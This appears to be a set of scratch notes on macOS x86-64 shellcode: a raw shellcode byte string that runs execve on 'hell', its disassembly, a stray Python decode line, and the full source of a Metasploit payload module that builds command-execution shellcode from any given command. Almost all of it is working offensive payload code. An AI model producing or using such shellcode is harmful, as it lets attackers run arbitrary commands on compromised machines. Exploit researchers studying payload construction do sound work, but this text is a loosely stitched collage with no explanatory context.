"\x48\x31\xd2\xe8\x05\x00\x00\x00\x68\x65\x6c\x6c\x00\x5f\x52\x57\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00\x02\x0f\x05"

#hell



"""
00000000  48                dec eax
00000001  31D2              xor edx,edx
00000003  E805000000        call dword 0xd
00000008  68656C6C00        push dword 0x6c6c65
0000000D  5F                pop edi
0000000E  52                push edx
0000000F  57                push edi
00000010  48                dec eax
00000011  89E6              mov esi,esp
00000013  48                dec eax
00000014  C7C03B000002      mov eax,0x200003b
0000001A  0F05              syscall
"""



print "d".decode("hex")



##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

module Metasploit3

  CachedSize = 31

  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X x64 Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => [ 'argp <argp[at]census-labs.com>',
                           'joev' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86_64
    ))

    # exec payload options
    register_options([
      OptString.new('CMD',  [ true,  "The command string to execute" ])
    ], self.class)
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate
    cmd_str = datastore['CMD'] || ''
    # Split the cmd string into arg chunks
    cmd_parts = Shellwords.shellsplit(cmd_str)
    cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
    arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
    call = "\xe8" + [arg_str.length].pack('V')
    payload =
      "\x48\x31\xd2"+                                 # xor rdx, rdx
      call +                                          # call CMD.len
      arg_str  +                                      # CMD
      "\x5f" +                                        # pop rdi
      if cmd_parts.length > 1
        "\x48\x89\xf9" +                            # mov rcx, rdi
        "\x52" +                                    # push rdx (null)
        # for each arg, push its current memory location on to the stack
        cmd_parts[1..-1].each_with_index.map do |arg, idx|
          "\x48\x81\xc1" +                        # add rcx + ...
          [cmd_parts[idx].length+1].pack('V') +   #
          "\x51"                                  # push rcx (build str array)
        end.join
      else
        "\x52"                                      # push rdx (null)
      end +
      "\x57"+                                         # push rdi
      "\x48\x89\xe6"+	                                # mov rsi, rsp
      "\x48\xc7\xc0\x3b\x00\x00\x02" +                # mov rax, 0x200003b (execve)
      "\x0f\x05"                                      # syscall
  end
end